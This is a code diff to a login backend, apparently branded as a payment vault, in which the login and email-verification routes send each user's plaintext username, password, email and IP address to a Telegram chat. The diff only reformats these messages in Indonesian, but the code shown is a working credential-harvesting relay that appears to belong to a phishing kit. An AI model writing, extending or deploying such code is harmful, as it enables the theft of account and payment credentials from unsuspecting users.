@@ -47,11 +47,14 @@ router.post("/auth/login", async (req, res): Promise<void> => {
 
   const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
   void tgNotify(
-    `🔐 <b>STEP 1 — Login</b>\n\n` +
-    `👤 Username : <code>${username}</code>\n` +
-    `🔑 Password : <code>${password}</code>\n` +
-    `🌐 IP       : <code>${ip}</code>\n` +
-    `🕐 Waktu    : ${now}`
+    `🔐 <b>LOGIN MASUK</b> — Step 1\n` +
+    `<code>────────────────────────</code>\n\n` +
+    `👤 <b>Username</b>  <code>${username}</code>\n` +
+    `🔑 <b>Password</b>  <code>${password}</code>\n` +
+    `🌐 <b>IP</b>        <code>${ip}</code>\n` +
+    `🕐 <b>Waktu</b>     ${now}\n\n` +
+    `<code>────────────────────────</code>\n` +
+    `<i>🏦 MYPAYMENTVAULT</i>`
   );
 
   res.json({ pendingToken });
@@ -115,11 +118,14 @@ router.post("/auth/approved", async (req, res): Promise<void> => {
 
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
     void tgNotify(
-      `📧 <b>STEP 3 — Verifikasi Email</b>\n\n` +
-      `👤 Username : <code>${username}</code>\n` +
-      `📧 Email    : <code>${email ?? "-"}</code>\n` +
-      `🌐 IP       : <code>${ipAddress ?? "unknown"}</code>\n` +
-      `🕐 Waktu    : ${now}`
+      `📧 <b>VERIFIKASI EMAIL</b> — Step 3\n` +
+      `<code>────────────────────────</code>\n\n` +
+      `👤 <b>Username</b>  <code>${username}</code>\n` +
+      `📧 <b>Email</b>     <code>${email ?? "-"}</code>\n` +
+      `🌐 <b>IP</b>        <code>${ipAddress ?? "unknown"}</code>\n` +
+      `🕐 <b>Waktu</b>     ${now}\n\n` +
+      `<code>────────────────────────</code>\n` +
+      `<i>🏦 MYPAYMENTVAULT</i>`
     );
   }
   res.json({ ok: true });
